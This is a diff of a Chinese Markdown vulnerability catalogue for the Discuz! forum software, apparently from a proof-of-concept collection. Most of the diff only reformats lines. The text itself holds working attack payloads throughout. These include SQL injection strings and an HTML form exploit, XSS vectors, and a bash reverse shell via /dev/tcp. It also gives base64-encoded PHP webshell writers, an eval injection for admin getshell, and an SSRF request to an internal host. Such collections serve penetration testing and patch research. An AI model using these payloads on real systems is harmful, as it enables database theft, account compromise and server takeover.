@@ -34,14 +34,19 @@ http://ip/member/pm.php?dopost=read&id=1
 ### 测试步骤与截图：
 各漏洞演示如下，共有19个功能或插件存在sql注入，但最后4个sql注入漏洞只找到POC，暂时无法演示。
 #### 演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞
-找到问卷调查专业版插件所在链接：http://xxxxx/plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline(问题出在orderby参数)，对该参数进行sql注入
+找到问卷调查专业版插件所在链接：
+
+http://xxxxx/plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline(问题出在orderby参数)，对该参数进行sql注入
 
 ![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/1.png)
 
 接下来就是使用sqlmap进行暴库了。
+
 参考链接：http://www.5kik.com/php0day/239.html
 #### 演示2：Discuz x3.2前台GET型SQL注入漏洞（绕过全局WAF）
-找到注入点：http://localhost/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]=x
+找到注入点：
+
+http://localhost/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]=x
 
 ![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/2.png)
 
@@ -74,7 +79,9 @@ http://ip/member/pm.php?dopost=read&id=1
 参考链接：https://www.secpulse.com/archives/26869.html
 #### 演示3：discuz ychat插件注入漏洞
 http://www.51jqa.com/plugin.php?id=ychat&mod=rooms&cid=6x
+
 cid参数存在SQL注入
+
 参考链接：https://bugs.shuimugan.com/bug/view?bug_no=108978
 #### 演示4：Discuz Plugin JiangHu 1.1 /forummission.php SQL注入漏洞
 forummission.php？index=show$id=24中的id参数存在sql注入漏洞
@@ -84,6 +91,7 @@ forummission.php？index=show$id=24中的id参数存在sql注入漏洞
 参考链接：http://www.gltc.cn/30161.html
 #### 演示5：Discuz 6.0 /my.php SQL注入漏洞
 把以下EXP保存成HTML文档
+
 <form method='post' action='http://dz6.0/my.php?item=buddylist'> <input type='hidden' value="1111" name="descriptionnew[1' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e,0x5430304C5320474F21,0x7e)  limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1#]" /><br /> <input type='submit' value='buddysubmit' name='buddysubmit' /><br /> </form>
 
 使用浏览器打开
@@ -92,7 +100,15 @@ forummission.php？index=show$id=24中的id参数存在sql注入漏洞
 
 参考链接：https://bugs.shuimugan.com/bug/view?bug_no=80359
 #### 演示6：UChome 注入漏洞1
-首先注册用户 然后新建一个相册 http://127.0.0.1/uchome/space.php?uid=2&do=album&view=me 打开这里点上传 新建完了之后 上传一个图片 完了之后 点进相册 然后在点刚刚上传的图片 点击管理图片 直接确认 然后抓包 把titie的那个改成 title%5B1' and (select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a)#%5D 原始内容可能是title%5B1%5D 修改成上面的 就可以看到错误信息了
+首先注册用户 然后新建一个相册 
+
+http://127.0.0.1/uchome/space.php?uid=2&do=album&view=me
+
+打开这里点上传 新建完了之后 上传一个图片 完了之后 点进相册 然后在点刚刚上传的图片 点击管理图片 直接确认 然后抓包 把titie的那个改成
+
+title%5B1' and (select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a)#%5D
+
+原始内容可能是title%5B1%5D 修改成上面的 就可以看到错误信息了
 
 ![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/12.png)
 
@@ -107,15 +123,21 @@ forummission.php？index=show$id=24中的id参数存在sql注入漏洞
 参考链接：https://www.seebug.org/vuldb/ssvid-93616
 #### 演示8：Discuz! X2.5 521交友插件 jiaoyou.php SQL注入漏洞
 http://ip/jiaoyou.php?pid=1
+
 http://ip/jiaoyou.php?mod=search&residecity=
+
 http://ip/jiaoyou.php?mod=search&resideprovince=
+
 pid、residecity、resideprovince参数均存在SQL注入
 
 ![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/15.png)
 
 参考链接：
+
 https://www.unhonker.com/bug/1058.html
+
 https://www.seebug.org/vuldb/ssvid-93641
+
 https://www.seebug.org/vuldb/ssvid-93641
 #### 演示9：Discuz! X2 V63积分商城插件 SQL注入漏洞
 在discuz v63积分商城插件注入漏洞exp中并不需要斜杠、#号和—注释符。所以会执行$clean = preg_replace(“/’(.+?)’/s”, ”, $sql);原来SQL语句中两个单引号中间的内容就会被替换为空。并不会进入到下面的else分支。Else下面的所有操作均是对$clean变量的操作。所以绕过的思路就是把SQL语句放在两个单引号中间。对于mysql的一个特性， @`’` 是为空的，所以我们的攻击语句可以放到两个@`’`中间，即使GPC开启，单引号被转义为\’，而@`’`变成@`\’`对注入也是没有影响的，所以此绕过方法无限制。
@@ -127,8 +149,13 @@ http://www.cnseay.com/discuz/plugin.php?id=v63shop:goods&pac=info&gid=110 or @
 可以看到我们的注入语句被替换掉了，所以后面的检查字符的时候并没有发现注入语句。
 参考链接：http://netsecurity.51cto.com/art/201303/386717.htm
 #### 演示10：Discuz x1.5 x2.0 二次注射
-访问http://xxxxx/forum.php?mod=misc&tid={1}&action=postappend&pid={2}进入回复主题界面。在发表回复的地方存在SQL注入。如输入“a',`subject`=(/*!select*/ group_concat(uid,':') from pre_common_member where groupid=1),comment='”。
+访问
+
+http://xxxxx/forum.php?mod=misc&tid={1}&action=postappend&pid={2}
+
+进入回复主题界面。在发表回复的地方存在SQL注入。如输入“a',`subject`=(/*!select*/ group_concat(uid,':') from pre_common_member where groupid=1),comment='”。
 刷新页面，可在主题回复中看到管理用户。
+
 参考链接：https://www.webshell.cc/562.html
 #### 演示11：Discuz! X2 forum_attachment.php sql注入漏洞
 http://www.discuz.net/forum.php?mod=attachment&findpost=ss&aid=
@@ -139,13 +166,18 @@ http://www.discuz.net/forum.php?mod=attachment&findpost=ss&aid=
 参考链接：https://www.cnblogs.com/devi1o/articles/4874822.html
 #### 演示12：Discuz！7.2/X1 第三方插件SQL注入及持久型XSS漏洞
 http://xxxxxxxx/plugin.php?id=moodwall&action=edit_mood&moodid=2
+
 moodid存在SQL注入。
+
 参考链接：https://www.seebug.org/vuldb/ssvid-93710
 #### 演示13：Discuz!论坛wap功能模块编码的注射漏洞
 http://xxxxxxx/space.php?username=
 username存在SQL注入，但可能此处会把’过滤成\’，如果是GBK编码的话，可使用宽字节注入的思路绕过。如设置payload为：/space.php?username=%cf'%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,password,50,51,52,53,54,55,56,57,database(),59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84%20from%20cdb_members%20where%20uid=1/*
+
 参考链接：
+
 http://www.vfocus.net/art/20080819/3755.html
+
 https://www.jb51.net/hack/12858.html
 #### 演示14：Discuz! pm.php注入
 http://127.0.0.1/dede/member/pm.php?dopost=read&id=1
@@ -163,33 +195,51 @@ id参数存在SQL注入。
 参考链接：https://www.seebug.org/vuldb/ssvid-93737
 漏洞POC：
 Discuz! 4.x SQL injection  POC
+
 https://www.exploit-db.com/exploits/2859/
+
 https://www.seebug.org/vuldb/ssvid-5482
+
 Discuz! 5.0.0 RC1 SQL injection PoC
+
 http://blog.sina.com.cn/s/blog_56fb0f050100055g.html
+
 Discuz! 5.0.0 GBK SQL Injection / Admin Credentials Disclosure Exploit
+
 https://www.seebug.org/vuldb/ssvid-16732
+
 Discuz! 5 SQL injection Exploit
+
 https://www.seebug.org/vuldb/ssvid-5263
 ## 反射型XSS漏洞
 ### 漏洞描述：跨站脚本攻击漏洞，恶意攻击者往web页面插入恶意脚本代码，而程序对于用户输入内容未过滤，当用户浏览该页之时，嵌入其中web里面的脚本代码会被执行，从而达到恶意攻击用户的特殊目的。窃取cookie、放蠕虫、网站钓鱼……。涉及URL如下：
 #### /include/global.func.php—>演示1
 http://ip/admincp.php?infloat=yes&handlekey=123
+
 http://ip/logging.php?infloat=yes&handlekey=123
+
 http://ip/api/uchome.php?infloat=yes&handlekey=123
 #### logging.php—>演示2
 http://ip/logging.php?action=logout&formhash=b1abb3e2&referer=
 #### source/function/function_core.php—>演示3
 http://ip/member.php?mod=logging&action=login&referer=javascript://www.discuz.net/
+
 http://ip/connect.php?receive=yes&mod=login&op=callback&referer=javascript://www.discuz.net/
 ### 测试步骤与截图：
 各漏洞演示如下，共有3个功能或插件存在反射型XSS
 #### 演示1：Discuz 7.2 反射型xss漏洞1
 访问以下链接即可触发XSS：
-http://ip/admincp.php?infloat=yes&handlekey=123);alert(/xss/);//  http://ip/logging.php?infloat=yes&handlekey=123);alert(/xss/);//  http://ip/api/uchome.php?infloat=yes&handlekey=123);alert(/xss/);//
+
+http://ip/admincp.php?infloat=yes&handlekey=123);alert(/xss/);//
+
+http://ip/logging.php?infloat=yes&handlekey=123);alert(/xss/);//
+
+http://ip/api/uchome.php?infloat=yes&handlekey=123);alert(/xss/);//
+
 参考链接：http://www.bubuko.com/infodetail-2094064.html
 #### 演示2：Discuz 7.2 反射型xss漏洞2
 访问如下链接即可触发
+
 http://ip/logging.php?action=logout&formhash=b1abb3e2&referer=%27-alert%28document.domain%29-
 
 ![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/21.png)
@@ -197,7 +247,9 @@ http://ip/logging.php?action=logout&formhash=b1abb3e2&referer=%27-alert%28docume
 参考链接：https://www.seebug.org/vuldb/ssvid-89252
 #### 演示3：Disucz X3.2 多处反射型XSS漏洞
 http://ip/member.php?mod=logging&action=login&referer=javascript://www.discuz.net/
+
 http://ip/connect.php?receive=yes&mod=login&op=callback&referer=javascript://www.discuz.net/
+
 以上链接的referer参数存在XSS漏洞，访问如上链接可查看HTML
 
 ![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/22.png)
@@ -241,6 +293,7 @@ discuz3.0-3.2有个功能叫直播的。实习版主就能开启哈~ 接着咱�
 
 参考链接：
 https://www.secpulse.com/archives/33389.html
+
 https://www.seebug.org/vuldb/ssvid-93716
 #### 演示2：全版本存储型（4.0版本之前，建议测试全版本）XSS及其绕过：
 此处演示绕过：在发帖或回复处添加“[email]2"onmouseover="alert(2)[/email]” 
@@ -254,8 +307,13 @@ https://www.seebug.org/vuldb/ssvid-93716
 ![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/30.png)
 
 参考链接：
+
 http://0day5.com/archives/3323/
-20150609补丁绕过：http://blog.knownsec.com/2015/12/discuz-20150609-xss-bug-fixes-bypass-report/
+
+20150609补丁绕过：
+
+http://blog.knownsec.com/2015/12/discuz-20150609-xss-bug-fixes-bypass-report/
+
 https://bugs.shuimugan.com/bug/view?bug_no=139851
 #### 演示3：Discuz! 链接格子插件 v2.5.1 存储型 XSS 漏洞
 在论坛自助购买广告位处，在“文字内容中”填写"><img/src=1/>
@@ -360,6 +418,7 @@ https://bugs.shuimugan.com/bug/view?bug_no=139851
 ![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/50.png)
 
 之后会执行XSS。
+
 参考链接：http://h2016.blog.163.com/blog/static/100863425200810413817385/
 ## 命令/代码执行漏洞
 ### 漏洞描述：Discuz组件中有部分功能代码未对用户的输入进行很好的过滤，导致可植入系统命令或代码到服务器执行。涉及URL如下：
@@ -394,6 +453,7 @@ http://ip/bbs/admincp.php?action=runwizard&step=3
 
 参考链接：
 https://www.seebug.org/vuldb/ssvid-97510
+
 https://www.anquanke.com/post/id/158270
 #### 演示2：Discuz X2.5 /source/class/class_image.php 命令执行漏洞
 在发贴上传附件，上传图片附近，预览抓包修改为以下链接
@@ -411,8 +471,11 @@ GET/dzx25/forum.php?mod=image&aid=1&size=|bash%20i%20>%26%20/dev/tcp/127.0.0.1/8
 
 参考链接：
 https://www.cnblogs.com/milantgh/p/4199432.html
+
 http://sh4d0w.lofter.com/post/1cb55ec4_2d35857
+
 https://www.secpulse.com/archives/2338.html
+
 https://bugs.shuimugan.com/bug/view?bug_no=80723
 #### 演示4：Discuz! x3.1 convert插件代码执行漏洞
 在该链接下：http://www.test.ichunqiu/bbs/admincp.php?/utility/convert/index.php?a=config&source=d7.2_x2.0
@@ -426,12 +489,17 @@ https://bugs.shuimugan.com/bug/view?bug_no=80723
 
 参考链接：
 https://bbs.ichunqiu.com/thread-1909-1-1.html
+
 https://www.webshell.cc/4664.html
 #### 演示5：Discuz! X2.5 远程代码执行漏洞
 a.注册任意账户。
+
 b.登陆用户，发表blog日志（注意是日志）。 
+
 c.添加图片，选择网络图片，地址{${fputs(fopen(base64_decode(ZGVtby5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))}} 
+
 d.访问日志，论坛根目录下生成demo.php，一句话密码：c。
+
 参考链接：http://www.freebuf.com/vuls/329.html
 #### 演示6：Discuz! X3.1后台任意代码执行可拿shell
 全局--〉网站第三方统计代码--〉插入php代码,如插入 <?php phpinfo();?>
@@ -468,10 +536,14 @@ d.访问日志，论坛根目录下生成demo.php，一句话密码：c。
 
 参考链接：https://www.seebug.org/vuldb/ssvid-93612
 #### 演示7：Discuz! 7.1 - 7.2 远程代码执行漏洞
-直接GET，利用语句：   http://xxxxx/misc.php?action=imme_binding&response[result]=aa:b&scriptlang[aa][b]={${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))}}   
+直接GET，利用语句：
+http://xxxxx/misc.php?action=imme_binding&response[result]=aa:b&scriptlang[aa][b]={${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))}}   
+
 在根目录生成C.PHP密码是C
+
 参考链接：
 http://blog.51cto.com/simeon/276114
+
 https://www.jb51.net/hack/26337.html
 #### 演示8：discuz 7.0 runwizard.inc.php 代码执行漏洞
 在该链接下：http://www.80vul.com/bbs/admincp.php?action=runwizard&step=3
@@ -480,7 +552,9 @@ https://www.jb51.net/hack/26337.html
 ![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/67.png)
 
 可获取到webshell
+
 http://www.80vul.com/bbs/forumdata/logs/runwizardlog.php
+
 参考链接：http://blog.51cto.com/simeon/113131
 #### 演示9：Discuz!X2.5最新版后台管理员权限Getshell
 在后台-->站长-->Ucenter设置处设置UcenterIP为: XX\\');eval($_POST[a])?>;// XX
@@ -526,6 +600,7 @@ http://www.80vul.com/bbs/forumdata/logs/runwizardlog.php
 ## SSRF漏洞
 ### 漏洞描述：SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。可利用来探测内网信息或获取别的网站的信息或钓鱼等。涉及URL如下：
 http://ip/bbs/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://xxxxxxxxxxxxxx.jpg[/img]&formhash=09cec465
+
 http://ip/discuz_x3.2_sc_gbk/upload/portal.php
 ### 漏洞场景：Discuz
 ### 漏洞地址：
@@ -540,12 +615,18 @@ http://ip/discuz_x3.2_sc_gbk/upload/portal.php
 
 ![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/78.png)
 
-从跳转的链接取出modthreadkey的参数值: http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=viewthread&tid=1&page=1&modthreadkey=fce8163c9f310147f91a244a9eb9dc33#pid1 
+从跳转的链接取出modthreadkey的参数值: 
+
+http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=viewthread&tid=1&page=1&modthreadkey=fce8163c9f310147f91a244a9eb9dc33#pid1 
+
 第二步 带上当前formhash,modarticlekey拼上第一步的modthreadkey的值,即可发请求: POST:http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=portalcp&ac=upload&aid=1&catid=1&op=downremotefile&formhash=760dc9d6&modarticlekey=fce8163c9f310147f91a244a9eb9dc33&content=<img src=http://internal.zabbix/images/general/zabbix.png> aa=a
 
 ![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/79.png)
 
-internal.zabbix域名下的图片被下载并上传到Discuz指定的图片路径下: http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png
+internal.zabbix域名下的图片被下载并上传到Discuz指定的图片路径下: 
+
+http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png
+
 http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png.thumb.jpg
 
 ![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/80.png)
@@ -582,6 +663,7 @@ http://ip/discuz3_2/home.php?mod=spacecp&ac=profile
 ![](https://github.com/cckuailong/PocCollect/blob/master/Web/Discuz/image/85.png)
 
 随便上传一张图片，即可删除importantfile.txt。
+
 http://www.freebuf.com/vuls/149904.html
 #### 演示2：Discuz! 后台第三方插件上传任意后缀文件拿shell（某插件导致）
 问题插件出在：[MZG]点广告赚积分 1.0 http://addon.discuz.com/?@mzg_advertise.plugin 1.先搜索 “MZG” 找到 点广告赚积分。
@@ -607,24 +689,43 @@ https://www.seebug.org/vuldb/ssvid-93632
 ## 其他类型漏洞
 ### 漏洞描述：越权、xxe
 Discuz! --X2/X2.5管理权限用户修改创始人用户密码漏洞
+
 https://www.seebug.org/vuldb/ssvid-93622
+
 Discuz!3.2 利用UC_KEY登陆任意用户
+
 https://www.seebug.org/vuldb/ssvid-89483
+
 Discuz! X3.1 逻辑错误漏洞
+
 https://www.seebug.org/vuldb/ssvid-89427
+
 discuz越权回复
+
 https://www.seebug.org/vuldb/ssvid-93753
+
 https://www.seebug.org/vuldb/ssvid-93609
+
 越权查看照片
+
 https://www.seebug.org/vuldb/ssvid-93721
+
 https://www.seebug.org/vuldb/ssvid-93722
+
 Discuz! 多个版本HTTP host头攻击漏洞
+
 https://www.seebug.org/vuldb/ssvid-93728
+
 Discuz! xxe 可破坏数据库结构，导致脏数据进入
+
 https://bugs.shuimugan.com/bug/view?bug_no=76041
+
 Discuz附件下载权限绕过
+
 https://www.seebug.org/vuldb/ssvid-93615
+
 知道key的情况下对ucserver进行注射
+
 https://bugs.shuimugan.com/bug/view?bug_no=65534
 
 ### 漏洞场景：登陆地址中含有session类字段
@@ -633,5 +734,6 @@ https://bugs.shuimugan.com/bug/view?bug_no=65534
 ### 测试步骤与截图：
 
 安全修复建议：
+
 每次会话由服务端生成随机的，唯一的，复杂的session。
 
